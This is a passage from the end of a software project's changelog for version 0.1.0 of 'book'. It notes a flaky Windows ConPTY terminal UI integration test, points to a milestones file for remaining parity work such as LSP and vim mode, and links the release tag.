- One ConPTY-based TUI integration test can flake under full parallel load on Windows; it passes in isolation.
- See [`MILESTONES.md`](./MILESTONES.md) for remaining Phase 1 parity work (LSP, more CLI flags, vim mode, etc.).

[0.1.0]: https://github.com/letrquan/book/releases/tag/v0.1.0
